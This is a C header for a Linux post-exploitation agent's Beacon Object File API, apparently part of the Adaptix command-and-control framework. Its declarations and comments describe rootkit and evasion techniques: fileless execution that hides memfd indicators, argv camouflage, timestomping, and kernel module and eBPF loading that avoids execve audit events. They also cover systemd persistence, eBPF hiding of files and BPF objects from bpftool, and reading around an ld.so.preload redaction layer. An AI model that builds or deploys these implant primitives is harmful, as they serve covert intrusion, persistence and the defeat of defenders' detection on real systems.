/// bof_api.h — Linux Beacon API header for BOF authors
/// This is the public API that BOF .o files link against.
/// Compile BOFs with: gcc -c -o bof.o bof.c -include bof_api.h -Os -fPIC

#ifndef LINUX_BEACON_API_H
#define LINUX_BEACON_API_H

/// ── Data parser types ──

typedef struct {
    char *original;
    char *buffer;
    int   length;
    int   size;
} datap;

typedef struct {
    char *original;
    char *buffer;
    int   length;
    int   size;
} formatp;

/// ── Output types (CS-compatible) ──

#define CALLBACK_OUTPUT      0x0
#define CALLBACK_OUTPUT_OEM  0x1e
#define CALLBACK_OUTPUT_UTF8 0x20
#define CALLBACK_ERROR       0x0d

/// ── Data Parser API ──

void   BeaconDataParse(datap *parser, char *buffer, int size);
int    BeaconDataInt(datap *parser);
short  BeaconDataShort(datap *parser);
int    BeaconDataLength(datap *parser);
char  *BeaconDataExtract(datap *parser, int *size);

/// ── Output API ──

void   BeaconOutput(int type, const char *data, int len);
void   BeaconPrintf(int type, const char *fmt, ...);

/// ── Format API ──

void   BeaconFormatAlloc(formatp *format, int maxsz);
void   BeaconFormatReset(formatp *format);
void   BeaconFormatAppend(formatp *format, const char *text, int len);
void   BeaconFormatPrintf(formatp *format, const char *fmt, ...);
char  *BeaconFormatToString(formatp *format, int *size);
void   BeaconFormatFree(formatp *format);
void   BeaconFormatInt(formatp *format, int value);

/// ── Utility ──

int    BeaconIsAdmin(void);

/// ── Async BOF APIs ──

void   BeaconWakeup(void);
int    BeaconGetStopJobEvent(void);  // returns readable fd (-1 if not async)

/// ── Adaptix extensions ──

void   AxDownloadMemory(char *filename, char *data, int len);

/// ── Linux system primitives (Adaptix extensions) ──
/// These expose the agent's nostdlib syscall wrappers to BOFs

// File I/O
int    AxOpenFile(const char *path, int flags, int mode);
int    AxCloseFile(int fd);
int    AxReadFile(int fd, void *buf, int count);
int    AxWriteFile(int fd, const void *buf, int count);

// File read helper — reads entire file into malloc'd buffer, returns bytes read (-1 on error)
int    AxReadFileToBuffer(const char *path, char **out_buf, int max_size);

// ★ 同上，但读的是**真身**：绕开 redact.c 对"我们自己产物"的读时抹平。
// 任何"读回来判断已经在不在 / 再写回去"的代码**必须**用它 ——
// 用 AxReadFileToBuffer 会读到被抹平的假内容，表现为"成功地什么都没做"，
// 甚至把假内容写回去毁掉自己的产物（ISS-076 实测）。
// 豁免协议（access(2) 打旗标 → 紧接 O_CLOEXEC 的 open 消费）的完整推导在 bof_api.c。
int    AxReadFileReal(const char *path, char **out_buf, int max_size);

// File stat
int    AxFileStat(const char *path, unsigned int *out_mode, long *out_size, unsigned int *out_uid, unsigned int *out_gid);

// Directory listing
int    AxOpenDir(const char *path);
int    AxReadDir(int fd, void *buf, int bufsize);

// Memory
void  *AxMalloc(int size);
void   AxFree(void *ptr);
void  *AxMemset(void *s, int c, int n);
void  *AxMemcpy(void *dst, const void *src, int n);

// String operations
int    AxStrlen(const char *s);
int    AxStrcmp(const char *a, const char *b);
int    AxStrncmp(const char *a, const char *b, int n);
char  *AxStrcpy(char *dst, const char *src);
char  *AxStrncpy(char *dst, const char *src, int n);
char  *AxStrcat(char *dst, const char *src);
char  *AxStrstr(const char *haystack, const char *needle);
char  *AxStrchr(const char *s, int c);

// Formatted output
int    AxSnprintf(char *buf, int size, const char *fmt, ...);

// Process info
int    AxGetPid(void);
int    AxGetUid(void);
int    AxGetEuid(void);

// getcwd
int    AxGetCwd(char *buf, int size);

// getenv equivalent — reads /proc/self/environ
int    AxGetEnv(const char *name, char *out_buf, int out_size);

// ── Privileged syscall primitives (persistence / privesc BOFs) ──

// exit_group(status) — terminate the calling process (BOF child error paths)
void   AxExit(int status);
// mkdir(path, mode)
int    AxMkdir(const char *path, int mode);
// stat(path) timestamps — for timestomp source matching
int    AxFileTimes(const char *path,
                   long *atime_sec, long *atime_nsec,
                   long *mtime_sec, long *mtime_nsec);
// fork() — child runs BOF logic, parent waits (crash isolation)
int    AxFork(void);
// wait4(pid) — returns child pid on success, -1 on error; status via wstatus
int    AxWaitPid(int pid, int *wstatus);
// memfd_create(name) — anonymous in-memory file, returns fd
int    AxMemfdCreate(const char *name);
// memfd_create with a CSPRNG-randomised name ("m<8hex>"), flags passed through
// (0 or MFD_CLOEXEC).  Prefer this over a fixed name: memfd_create("x") leaves a
// constant string in /proc/<pid>/maps — a greppable IOC (方案 §3.2).
int    AxMemfdCreateRandom(int flags);
// P1-b：无盘可执行载体 —— 写进 tmpfs 文件（<dir>/.m<8hex>）后**立刻 unlink**，
// 返回该文件的 CLOEXEC fd，配合 AxExecFd/AxExecFdArgv 执行。
// 相比 memfd 的收益：/proc/<pid>/{exe,maps,fd} 显示 "<dir>/.m… (deleted)" 而不是
// 内核硬编码的 "/memfd:<name>"（后者是一级 fileless 执行 IOC），且不产生
// memfd_create 系统调用。tmpfs 仍是内存文件系统 → 无盘属性不变。
// out_rfd（可传 NULL）= 另开的只读 fd（独立 f_pos），专供 execve 被拒后的回退读。
// 返回 <3 表示拿不到 tmpfs 载体（调用方应退回 AxMemfdCreateRandom）。
int    AxTmpfsCarrier(const void *data, int len, int *out_rfd);
// execve("/proc/self/fd/<fd>") — execute an fd (memfd) in the current process
int    AxExecFd(int fd);
// utimensat — set atime/mtime (timestomp); dirfd = -100 for AT_FDCWD
int    AxUtimensat(int dirfd, const char *path,
                   long atime_sec, long atime_nsec,
                   long mtime_sec, long mtime_nsec);
// fchmodat(AT_FDCWD, path, mode) — chmod
int    AxChmod(const char *path, int mode);
// finit_module(fd) — load a kernel module from an fd (no insmod execve)
long   AxFinitModule(int fd, int flags);
// raw bpf() syscall — load/attach eBPF programs without execve
long   AxBpf(int cmd, void *attr, unsigned int size);
// perf_event_open(attr, pid, cpu, group_fd, flags) — eBPF attach plumbing.
// attr is a struct perf_event_attr* (kernel UAPI layout, first 64 bytes =
// PERF_ATTR_SIZE_VER0); flags takes PERF_FLAG_FD_CLOEXEC (=8), NOT O_CLOEXEC.
long   AxPerfEventOpen(void *attr, int pid, int cpu, int group_fd, unsigned long flags);
// ioctl(fd, request, arg) — PERF_EVENT_IOC_SET_BPF / ENABLE
long   AxIoctl(int fd, unsigned long request, void *arg);
// unlink(path) — the ONLY way to unpin a /sys/fs/bpf object.  bpf(BPF_OBJ_PIN)
// with bpf_fd=0 does not unpin anything (it returns EINVAL); that mistaken
// assumption left every pin in place on "failsafe unload".
int    AxUnlink(const char *path);
// symlink(target, linkpath) — 建符号链接。systemd 的 *.wants/ 条目必须是
// 符号链接（systemctl enable 做的就是这件事），没有它单元不会开机启动；
// 用 syscall 建而不是 execve systemctl enable，避免多一条 execve 审计事件。
int    AxSymlink(const char *target, const char *linkpath);
// setsid() — new session: detaches the caller from the agent's session and
// process group, so a later killpg() against the agent cannot reach it.
int    AxSetsid(void);
// dup2(oldfd, newfd)
int    AxDup2(int oldfd, int newfd);
// pipe(fds) — fds[0] = read end, fds[1] = write end (flags = 0).
int    AxPipe(int fds[2]);
// execve("/proc/self/fd/<fd>", argv, envp) — same as AxExecFd but with a caller
// argv, which is what makes argv[0] camouflage possible.  AxExecFd passes
// argv = {NULL}, so the payload runs with an EMPTY cmdline.  NULL falls back
// to {NULL} for either.
int    AxExecFdArgv(int fd, char *const argv[], char *const envp[]);
// getrandom(buf, len) — CSPRNG bytes; returns bytes filled or -1.
int    AxGetRandom(void *buf, int len);
// access(path, mode) — R_OK=4 / F_OK=0, 0 on success.
//
// Exists for exactly one reason: redact.c (P3-A) only lets a read of
// /etc/ld.so.preload through when the *same* process has just probed it with
// access(2) AND opens it with O_CLOEXEC — that pair is what tells ld.so apart
// from a tool.  Any of our own code that must see the REAL preload body has to
// look like the loader, not like a tool (see AxReadFileReal below — 协议已单点化).
int    AxAccess(const char *path, int mode);

// ---- G7 闭环：hide_names 自动登记（持久化产物 × 隐藏层联动）------------
// 把 BOF 落地的 dirent 名写进 ebpf_load 建的 hide_names（<pin>_map0）。hide.c 侧的
// key 语义是「64 字节定长、名字在前、NUL 填充到满」—— 少填一个字节就与 hide.c 失配、
// **静默不隐藏**。所以写入只此一份实现，持久化 BOF 与 hide_add 都走它。
//
// pin 解析顺序：显式 pin → AxSetBpfPin 记下的 → 扫 /sys/fs/bpf。
// ⚠ 第三级（扫描）在 P8 之后**基本是死的**：ebpf_load 会自动把 `<pin>_map0` 等
// 10 个名字写进 hide_names，而那个过滤无目录限定、对 root 与本进程一视同仁 ——
// 于是扫 /sys/fs/bpf 永远列不出东西，且**不报错**。别把扫描当可靠后路：
// 要么让 ebpf_load 报上 pin 名（它每次加载都会 AxSetBpfPin），要么显式给 pin。
// 返回 0 成功；-1 写入失败（含 map 满）；-2 没找到 hide_names（ebpf_load 没跑，
// 或 pin 名已被 hide_names 自己藏起来）。
int    AxSetBpfPin(const char *pin);

// ── P8 §6d：pin 注册表 ──────────────────────────────────────────────
// 只有 getdents 钩子那一份 hide_names 会被读（hide 实例那张）；别的实例的同名表
// 没人查。所以"加载时自动藏自己的 pin 名"必须知道 **dirent pin 是谁**，而加载
// 顺序不可控 —— 这个注册表就是为它准备的（设计说明见 bof_api.c 定义处）。
int         AxPinRegAdd(const char *pin);   // 1=新登记 0=已有 -1=表满/非法
int         AxPinRegCount(void);
const char *AxPinRegGet(int i);             // NULL=越界
int         AxPinRegDirent(const char *pin);// 1=新认领 0=已认领 -1=非法
const char *AxPinRegDirentPin(void);        // NULL=还没有 getdents 实例加载过

// ── P8 §6e：内核对象 id 注册表 ─────────────────────────────────────────
// §6d 的反面：hidden_bpf_ids 同样有**多份**，但只有 sys_enter_bpf 钩子（bpf_filter
// 实例）那张会被读。别的模块的 prog/map id 只有写进它才从 bpftool 里消失 ——
// 两个模块同载时这个缺口会露出来（p21 T3 实测抓到）。设计说明见 bof_api.c 定义处。
int          AxIdRegAdd(const unsigned int *ids, int n); // 返回写进 sink 的条数，-1=非法
int          AxIdRegCount(void);
int          AxIdRegSink(const char *pin);   // bpf_filter 认领；返回重放的条数，-1=失败
const char  *AxIdRegSinkPin(void);           // NULL=还没有 bpf_filter 加载过
int    AxHideNameAdd(const char *pin, const char *name);

// ── P8：卸载侧的回收口（handle 版）──────────────────────────────────────
// 卸载必须「开 _map0 → unpin → 删键 → 关 fd」：unpin 后 `<pin>_map0` 已经不在，
// 按路径重开的写法只能在 unpin **之前**删键，中途失败就会留下"文件还在、但不再
// 被隐藏"的裸露状态。握着 fd 跨过去，map 由 fd 续命，两个问题一起没有。
int    AxHidePinOpen(const char *pin);        // -> fd (>=0) / -1 打不开
int    AxHideFdAdd(int fd, const char *name);  //  0 / -1
int    AxHideFdDel(int fd, const char *name);  //  0 / -1
void   AxHideFdClose(int fd);
int    AxHideNameDel(const char *pin, const char *name);   // 便捷版，卸载别用

// ── ISS-073：BeaconDataExtract 的返回值**不是 C 字符串** ────────────────────
// 它返回的是**长度切片的裸指针**（bof_api.c：原样返回 parser->buffer，只把长度
// 写进 *len），既不写 NUL、也不保证切片后面有 NUL —— args 是 agent 收到的
// msgpack 报文 `{content, args, entry_func}`（elf_bof.c:753）里 `args` 字段的
// 一个切片，切片后面紧跟同一缓冲区里的下一个 msgpack 字段。
//
// 直接喂 `%s` / 喂按路径取文件的 API，会一路读进相邻内存。**是否出事取决于切片
// 末尾那个字节恰好是不是 0** ⇒ 平时表现为"偶尔能跑通"，功能测试极难发现。
//   实测（p22 首跑）：ko_load 把 "/tmp/p22ko/axp22probe.ko" 读成了
//   "/tmp/p22ko/axp22probe.ko<垃圾>entry_func<垃圾>go"（open 当然 ENOENT）。
//   本仓库已被它咬过一次：ebpf_load.c:481-483 的注释记着按 NUL 扫描把下一个字段
//   的长度字节折进了 map key（"name" -> "name\x06"），hide 因此**静默失效**。
//
// 需要当 C 字符串用，一律先过这个函数（或等价的 ax_cstr）。判据：
// tools/p23_args_cstr_check.py（静态，逐站点断言"消费方拿到长度了吗"）。
static inline int AxCStr(char *dst, int cap, const char *src, int len) {
    if (!dst || cap <= 0) return 0;
    dst[0] = 0;
    if (!src || len <= 0) return 0;
    if (len > cap - 1) len = cap - 1;
    AxMemcpy(dst, src, len);
    dst[len] = 0;
    return len;
}

#endif // LINUX_BEACON_API_H
